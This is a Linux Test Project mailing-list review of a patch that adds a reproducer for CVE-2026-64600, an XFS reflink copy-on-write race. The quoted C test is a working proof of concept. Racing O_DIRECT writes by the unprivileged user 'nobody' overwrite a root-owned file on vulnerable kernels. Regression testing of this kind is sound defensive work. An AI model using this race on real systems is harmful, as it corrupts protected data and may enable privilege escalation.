Return-Path: <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from picard.linux.it (picard.linux.it [213.254.12.146])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id DB308C54F54
	for <ltp@archiver.kernel.org>; Fri, 31 Jul 2026 16:37:22 +0000 (UTC)
Received: from picard.linux.it (localhost [IPv6:::1])
	by picard.linux.it (Postfix) with ESMTP id 147E53E7256
	for <ltp@archiver.kernel.org>; Fri, 31 Jul 2026 18:37:21 +0200 (CEST)
Received: from in-4.smtp.seeweb.it (in-4.smtp.seeweb.it
 [IPv6:2001:4b78:1:20::4])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature ECDSA (secp384r1))
 (No client certificate requested)
 by picard.linux.it (Postfix) with ESMTPS id 7F28D3E1B4F
 for <ltp@lists.linux.it>; Fri, 31 Jul 2026 18:37:04 +0200 (CEST)
Received: from smtp-out2.suse.de (smtp-out2.suse.de
 [IPv6:2a07:de40:b251:101:10:150:64:2])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
 (No client certificate requested)
 by in-4.smtp.seeweb.it (Postfix) with ESMTPS id 5481E1000432
 for <ltp@lists.linux.it>; Fri, 31 Jul 2026 18:37:03 +0200 (CEST)
Received: from imap1.dmz-prg2.suse.org (unknown [10.150.64.97])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by smtp-out2.suse.de (Postfix) with ESMTPS id D9A733F4E;
 Fri, 31 Jul 2026 16:36:53 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.cz; s=susede2_rsa;
 t=1785515818; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references:autocrypt:autocrypt;
 bh=FUWxkPXVkynYM8vxQJrVEVqR2MG/X0+4yboPM013Kq0=;
 b=LY//uQguHkHnLkb+zTMXrr2EPhF4+mBt1iCv03jzPwKZ+/Tp/eVy+HFHu6F+exklWJetS/
 0vmc5JwjAUMbAvuGlsQT4ihS9QhSVAD1gseO5zubBwTeZ5WrIH7mx6PWxj4dTwb5rEH6Bk
 VncsAmNuDfjkBhnYWf7LgjnPHsMwqPc=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.cz;
 s=susede2_ed25519; t=1785515818;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references:autocrypt:autocrypt;
 bh=FUWxkPXVkynYM8vxQJrVEVqR2MG/X0+4yboPM013Kq0=;
 b=WBAdypiNI1lgy85HvDRQSrxXh39V3KJJQtLU79cnQEMgP+ghll4IrejLDPmZQXXZaJzTMH
 7FoozW1U1cx7etAQ==
Authentication-Results: smtp-out2.suse.de;
	none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.cz; s=susede2_rsa;
 t=1785515813; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references:autocrypt:autocrypt;
 bh=FUWxkPXVkynYM8vxQJrVEVqR2MG/X0+4yboPM013Kq0=;
 b=X3mySZoyI9Xdg+zp4nh+xv8jG3NLRUAcWB8GWZ/gAP7P+8uQQQ9s9OIi0cOF1BhYNGcJuS
 6ywJRXcoeIUkLEKgjXdkdWy3SFIJI+NCcQw3yJhHjDJl7NawxidBrUBC9Ew/IFhMWy2F/r
 qPiQ3LqNSvDqeTHYaxuNj5k+uq9za4g=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.cz;
 s=susede2_ed25519; t=1785515813;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references:autocrypt:autocrypt;
 bh=FUWxkPXVkynYM8vxQJrVEVqR2MG/X0+4yboPM013Kq0=;
 b=cWNFcJ7V7jmaKDMFnCNk91o+Fh4wpPjqPsKfkXkSbWy5xF4Tz9gA4Xc+KcKBeCiU+uM38Q
 HpQOAp6V7mCg72CQ==
Received: from imap1.dmz-prg2.suse.org (localhost [127.0.0.1])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id CD33F779B0;
 Fri, 31 Jul 2026 16:36:53 +0000 (UTC)
Received: from dovecot-director2.suse.de ([2a07:de40:b281:106:10:150:64:167])
 by imap1.dmz-prg2.suse.org with ESMTPSA id Cq3KMSXPbGpRewAAD6G6ig
 (envelope-from <mdoucha@suse.cz>); Fri, 31 Jul 2026 16:36:53 +0000
Message-ID: <ce015f1a-9433-40b4-a207-87e7c5142d4b@suse.cz>
Date: Fri, 31 Jul 2026 18:36:53 +0200
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
To: Andrea Cervesato <andrea.cervesato@suse.de>,
 Linux Test Project <ltp@lists.linux.it>
References: <20260731-cve-2026-64600-v4-1-8a222eca3a5d@suse.com>
Content-Language: en-US
From: Martin Doucha <mdoucha@suse.cz>
Autocrypt: addr=mdoucha@suse.cz; keydata=
 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 ag==
In-Reply-To: <20260731-cve-2026-64600-v4-1-8a222eca3a5d@suse.com>
X-Spamd-Result: default: False [-8.30 / 50.00]; REPLY(-4.00)[];
 BAYES_HAM(-3.00)[100.00%]; NEURAL_HAM_LONG(-1.00)[-1.000];
 NEURAL_HAM_SHORT(-0.20)[-1.000]; MIME_GOOD(-0.10)[text/plain];
 TO_MATCH_ENVRCPT_ALL(0.00)[]; TO_DN_ALL(0.00)[];
 DKIM_SIGNED(0.00)[suse.cz:s=susede2_rsa,suse.cz:s=susede2_ed25519];
 ARC_NA(0.00)[]; RCPT_COUNT_TWO(0.00)[2]; FROM_HAS_DN(0.00)[];
 RCVD_TLS_ALL(0.00)[]; RCVD_VIA_SMTP_AUTH(0.00)[];
 FROM_EQ_ENVFROM(0.00)[]; MIME_TRACE(0.00)[0:+];
 RCVD_COUNT_TWO(0.00)[2]; MID_RHS_MATCH_FROM(0.00)[];
 DBL_BLOCKED_OPENRESOLVER(0.00)[mitre.org:url, suse.cz:mid, suse.cz:email,
 suse.com:email, imap1.dmz-prg2.suse.org:helo, qualys.com:url]
X-Virus-Scanned: clamav-milter 1.0.9 at in-4.smtp.seeweb.it
X-Virus-Status: Clean
Subject: Re: [LTP] [PATCH v4] cve: reproducer for cve-2026-64600
X-BeenThere: ltp@lists.linux.it
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Linux Test Project <ltp.lists.linux.it>
List-Unsubscribe: <https://lists.linux.it/options/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=unsubscribe>
List-Archive: <http://lists.linux.it/pipermail/ltp/>
List-Post: <mailto:ltp@lists.linux.it>
List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=subscribe>
Content-Transfer-Encoding: 7bit
Content-Type: text/plain; charset="us-ascii"; Format="flowed"
Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>

Hi,
two nits below, otherwise LGTM.

Reviewed-by: Martin Doucha <mdoucha@suse.cz>

On 7/31/26 16:25, Andrea Cervesato wrote:
> From: Andrea Cervesato <andrea.cervesato@suse.com>
> 
> Reproducer for CVE-2026-64600 ("RefluXFS"), a race condition in the XFS
> reflink copy-on-write path for direct I/O writes. The bug was introduced
> in kernel v4.11 by commit 3c68d44a2b49 ("xfs: allocate direct I/O COW
> blocks in iomap_begin") and fixed by commit 2f4acd0fcd86 ("xfs: resample
> the data fork mapping after cycling ILOCK").
> 
> Signed-off-by: Andrea Cervesato <andrea.cervesato@suse.com>
> ---
> This reproducer has been created with the usage of Kimi K3 (as analyzer
> and writer) and DeepSeek v4 Flash (Max) as reviewer, by taking the
> RefluXFS technical paper as input:
> https://cdn2.qualys.com/advisory/2026/07/22/RefluXFS.txt
> 
> On bugged kernel:
> 
> tst_test.c:2047: TINFO: LTP version: 20260529-131-gd12a6186b
> tst_test.c:2050: TINFO: Tested kernel: 7.2.0-rc1-virtme #21 SMP PREEMPT_DYNAMIC Fri Jul 24 10:20:05 CEST 2026 x86_64
> tst_kconfig.c:90: TINFO: Parsing kernel config '/lib/modules/7.2.0-rc1-virtme/build/.config'
> tst_test.c:1875: TINFO: Overall timeout per run is 0h 00m 30s
> cve-2026-64600.c:233: TFAIL: round 0: racing O_DIRECT write to the clone succeeded
> [    1.252815] cve-2026-646
> HINT: You _MAY_ be missing kernel fixes:
> 
> https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=2f4acd0fcd86
> 
> HINT: You _MAY_ be vulnerable to CVE(s):
> 
> https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-64600
> 
> Summary:
> passed   0
> failed   1
> broken   0
> skipped  0
> warnings 0
> 
> On patched kernel:
> 
> tst_test.c:2047: TINFO: LTP version: 20260529-131-gd12a6186b
> tst_test.c:2050: TINFO: Tested kernel: 7.2.0-rc1-virtme #20 SMP PREEMPT_DYNAMIC Fri Jul 24 10:08:53 CEST 2026 x86_64
> tst_kconfig.c:90: TINFO: Parsing kernel config '/lib/modules/7.2.0-rc1-virtme/build/.config'
> tst_test.c:1875: TINFO: Overall timeout per run is 0h 00m 30s
> [    1.665909] clocksource: Watchdog remote CPU 2 read timed out
> [    8.099229] cve-2026-64600 (249) used greatest stack depth: 12216 bytes left
> cve-2026-64600.c:242: TPASS: Source file survived racing O_DIRECT writers
> 
> Summary:
> passed   1
> failed   0
> broken   0
> skipped  0
> warnings 0
> ---
> Changes in v4:
> - remove pressure thread
> - move cve before memory leaking CVEs
> - Link to v3: https://lore.kernel.org/20260731-cve-2026-64600-v3-1-192da4ddf707@suse.com
> 
> Changes in v3:
> - use fuzzy loop
> - get blksize from stat()
> - remove cleanup sentence in the description
> - Link to v2: https://lore.kernel.org/20260724-cve-2026-64600-v2-1-c039960448f6@suse.com
> 
> Changes in v2:
> - rename refluxfs.c
> - ensure reflink=1 for mkfs.xfs
> - remove root restore
> - Link to v1: https://lore.kernel.org/20260724-cve-2026-64600-v1-1-8fa214385d2e@suse.com
> ---
>   runtest/cve              |   1 +
>   testcases/cve/.gitignore |   1 +
>   testcases/cve/refluxfs.c | 228 +++++++++++++++++++++++++++++++++++++++++++++++
>   3 files changed, 230 insertions(+)
> 
> diff --git a/runtest/cve b/runtest/cve
> index 99d84270b6efc9afae5bd27adee704603c3092f7..426b203e9ce25992386923c5543e33256caf5d03 100644
> --- a/runtest/cve
> +++ b/runtest/cve
> @@ -89,6 +89,7 @@ cve-2023-0461 setsockopt10
>   cve-2023-31248 nft02
>   cve-2023-52879 fanotify25
>   cve-2026-53362 setsockopt11
> +cve-2026-64600 refluxfs
>   # Tests below may cause kernel memory leak
>   cve-2020-25704 perf_event_open03
>   cve-2022-0185 fsconfig03
> diff --git a/testcases/cve/.gitignore b/testcases/cve/.gitignore
> index bc1af0dd2c8086e4f5f78a3b15b91fafbd8f5936..5aa038cd5871424967035b39bd3945a038ad13b8 100644
> --- a/testcases/cve/.gitignore
> +++ b/testcases/cve/.gitignore
> @@ -16,3 +16,4 @@ tcindex01
>   cve-2025-38236
>   cve-2025-21756
>   cve-2026-46331
> +refluxfs
> diff --git a/testcases/cve/refluxfs.c b/testcases/cve/refluxfs.c
> new file mode 100644
> index 0000000000000000000000000000000000000000..c448947ca5bcd1602d18545c20e0b40f9a3c035a
> --- /dev/null
> +++ b/testcases/cve/refluxfs.c
> @@ -0,0 +1,228 @@
> +// SPDX-License-Identifier: GPL-2.0-or-later
> +/*
> + * Copyright (C) 2026 SUSE LLC Andrea Cervesato <andrea.cervesato@suse.com>
> + */
> +
> +/*\
> + * Reproducer for CVE-2026-64600 ("RefluXFS"), a race condition in the XFS
> + * reflink copy-on-write path for direct I/O writes. The bug was introduced
> + * in kernel v4.11 by commit 3c68d44a2b49 ("xfs: allocate direct I/O COW
> + * blocks in iomap_begin") and fixed by commit 2f4acd0fcd86 ("xfs: resample
> + * the data fork mapping after cycling ILOCK").
> + *
> + * When an :manpage:`ioctl(2)` FICLONE clone is written via ``O_DIRECT``,
> + * ``xfs_direct_write_iomap_begin()`` samples the clone's data-fork mapping
> + * under ILOCK and calls ``xfs_reflink_allocate_cow()``, which drops the
> + * ILOCK to allocate a transaction and then re-checks whether the *stale*
> + * physical block is still shared. If a second racing ``O_DIRECT`` writer
> + * completes a full copy-on-write cycle inside that lock-drop window, the
> + * old shared block's refcount drops to one, the first writer takes the
> + * "not shared, write in place" branch, and its write is submitted to the
> + * physical block that now belongs only to the reflink source file,
> + * corrupting it on disk.
> + *
> + * [Algorithm]
> + *
> + * - Create a root-owned target file on a reflink-enabled XFS and fill
> + *   its first block with a known pattern
> + * - Drop privileges to the unprivileged user ``nobody``
> + * - Positive control: a single ``O_DIRECT`` write to a fresh clone must
> + *   be copy-on-written and leave the target untouched
> + * - Each round: reflink-clone the target into a scratch clone file and
> + *   release a barrier of threads, each issuing one block-sized
> + *   ``O_DIRECT`` :manpage:`pwrite(2)` at offset 0 of the clone
> + * - After each round, read back the target's first block bypassing the
> + *   page cache (``O_DIRECT``): any byte differing from the original
> + *   pattern means a racing write refluxed into the source file and the
> + *   kernel is vulnerable
> + */

The algorithm description is out of date now since the synchronization 
is done through the fuzzy sync library instead of a barrier.

> +
> +#include <pwd.h>
> +
> +#include "tst_test.h"
> +#include "tst_safe_prw.h"
> +#include "lapi/ficlone.h"
> +#include "tst_fuzzy_sync.h"
> +
> +#define MNTPOINT	"mnt"
> +#define WORKDIR		MNTPOINT "/work"
> +#define TARGET		WORKDIR "/target"
> +#define CLONE		WORKDIR "/clone"
> +#define SCRATCH_FMT	WORKDIR "/scratch%d"

SCRATCH_FMT is never used.

> +
> +static char *tbuf, *wbuf, *rbuf;
> +
> +static int target_fd = -1;
> +static int target_dio_fd = -1;
> +static int clone_fd = -1;
> +
> +static int blksize;
> +
> +static struct tst_fzsync_pair pair;
> +
> +static void *writer_b(void *arg)
> +{
> +	int fd;
> +
> +	(void)arg;
> +
> +	while (tst_fzsync_run_b(&pair)) {
> +		tst_fzsync_wait_b(&pair);
> +
> +		fd = SAFE_OPEN(CLONE, O_RDWR | O_DIRECT);
> +
> +		tst_fzsync_start_race_b(&pair);
> +		SAFE_PWRITE(1, fd, wbuf, blksize, 0);
> +		tst_fzsync_end_race_b(&pair);
> +
> +		SAFE_CLOSE(fd);
> +	}
> +
> +	return NULL;
> +}
> +
> +static void drop_privileges(void)
> +{
> +	struct passwd *pw;
> +
> +	pw = SAFE_GETPWNAM("nobody");
> +	SAFE_SETEGID(pw->pw_gid);
> +	SAFE_SETEUID(pw->pw_uid);
> +}
> +
> +static void setup(void)
> +{
> +	int probe_fd, probe_dio_fd;
> +	struct stat sb;
> +
> +	SAFE_STAT(".", &sb);
> +	blksize = sb.st_blksize;
> +
> +	tbuf = SAFE_MEMALIGN(blksize, blksize);
> +	wbuf = SAFE_MEMALIGN(blksize, blksize);
> +	rbuf = SAFE_MEMALIGN(blksize, blksize);
> +
> +	memset(tbuf, 'A', blksize);
> +	memset(wbuf, 'X', blksize);
> +	memset(rbuf, 0, blksize);
> +
> +	SAFE_MKDIR(WORKDIR, 0700);
> +	SAFE_CHMOD(WORKDIR, 0777);
> +
> +	target_fd = SAFE_OPEN(TARGET, O_RDWR | O_CREAT | O_TRUNC, 0644);
> +	SAFE_WRITE(1, target_fd, tbuf, blksize);
> +	SAFE_FSYNC(target_fd);
> +	SAFE_CLOSE(target_fd);
> +
> +	drop_privileges();
> +
> +	target_fd = SAFE_OPEN(TARGET, O_RDONLY);
> +	probe_fd = SAFE_OPEN(CLONE, O_RDWR | O_CREAT | O_TRUNC, 0600);
> +
> +	TEST(ioctl(probe_fd, FICLONE, target_fd));
> +	if (TST_RET == -1) {
> +		if (TST_ERR == EOPNOTSUPP || TST_ERR == EINVAL || TST_ERR == ENOSYS) {
> +			tst_brk(TCONF, "reflink clones not supported: %s",
> +				tst_strerrno(TST_ERR));
> +		}
> +
> +		tst_brk(TBROK | TTERRNO, "ioctl(FICLONE) failed");
> +	}
> +
> +	probe_dio_fd = SAFE_OPEN(CLONE, O_RDWR | O_DIRECT);
> +	SAFE_PWRITE(1, probe_dio_fd, wbuf, blksize, 0);
> +	SAFE_CLOSE(probe_dio_fd);
> +	SAFE_CLOSE(probe_fd);
> +
> +	/* The racy write bypasses the target's page cache, so must the read */
> +	target_dio_fd = SAFE_OPEN(TARGET, O_RDONLY | O_DIRECT);
> +
> +	SAFE_PREAD(1, target_dio_fd, rbuf, blksize, 0);
> +	if (memcmp(rbuf, tbuf, blksize))
> +		tst_brk(TBROK, "Source file modified by a single O_DIRECT write to the clone");
> +
> +	tst_fzsync_pair_init(&pair);
> +}
> +
> +static void run(void)
> +{
> +	int corrupted = 0;
> +
> +	tst_fzsync_pair_reset(&pair, writer_b);
> +
> +	while (tst_fzsync_run_a(&pair)) {
> +		clone_fd = SAFE_OPEN(CLONE, O_RDWR | O_CREAT | O_TRUNC, 0600);
> +
> +		/*
> +		 * target_fd is O_RDONLY opened as "nobody".  FICLONE
> +		 * checks inode permission against our effective UID.
> +		 */
> +		SAFE_IOCTL(clone_fd, FICLONE, target_fd);
> +		SAFE_CLOSE(clone_fd);
> +
> +		clone_fd = SAFE_OPEN(CLONE, O_RDWR | O_DIRECT);
> +
> +		tst_fzsync_wait_a(&pair);
> +
> +		tst_fzsync_start_race_a(&pair);
> +		SAFE_PWRITE(1, clone_fd, wbuf, blksize, 0);
> +		tst_fzsync_end_race_a(&pair);
> +
> +		SAFE_PREAD(1, target_dio_fd, rbuf, blksize, 0);
> +		SAFE_CLOSE(clone_fd);
> +
> +		if (memcmp(rbuf, tbuf, blksize)) {
> +			tst_res(TFAIL, "racing O_DIRECT write to the clone succeeded at loop %d", pair.exec_loop);
> +			corrupted = 1;
> +			break;
> +		}
> +	}
> +
> +	if (!corrupted)
> +		tst_res(TPASS, "Source file survived racing O_DIRECT writers");
> +}
> +
> +static void cleanup(void)
> +{
> +	tst_fzsync_pair_cleanup(&pair);
> +
> +	if (target_dio_fd != -1)
> +		SAFE_CLOSE(target_dio_fd);
> +
> +	if (target_fd != -1)
> +		SAFE_CLOSE(target_fd);
> +
> +	if (clone_fd != -1)
> +		SAFE_CLOSE(clone_fd);
> +
> +	free(tbuf);
> +	free(wbuf);
> +	free(rbuf);
> +}
> +
> +static struct tst_test test = {
> +	.test_all = run,
> +	.setup = setup,
> +	.cleanup = cleanup,
> +	.runtime = 180,
> +	.needs_root = 1,
> +	.mount_device = 1,
> +	.mntpoint = MNTPOINT,
> +	.filesystems = (struct tst_fs []) {
> +		{
> +			.type = "xfs",
> +			.min_kver = "4.16",
> +			.mkfs_ver = "mkfs.xfs >= 1.5.0",
> +			.mkfs_opts = (const char *const []) {
> +				"-m", "reflink=1",
> +				NULL
> +			},
> +		},
> +		{}
> +	},
> +	.tags = (const struct tst_tag[]) {
> +		{"linux-git", "2f4acd0fcd86"},
> +		{"CVE", "2026-64600"},
> +		{}
> +	},
> +};
> 
> ---
> base-commit: 2a002a2c7b0a5433f22d2684c50a60ed12ccff70
> change-id: 20260724-cve-2026-64600-53fd6d627d63
> 
> Best regards,


-- 
Martin Doucha   mdoucha@suse.cz
SW Quality Engineer
SUSE LINUX, s.r.o.
CORSO IIa
Krizikova 148/34
186 00 Prague 8
Czech Republic

-- 
Mailing list info: https://lists.linux.it/listinfo/ltp
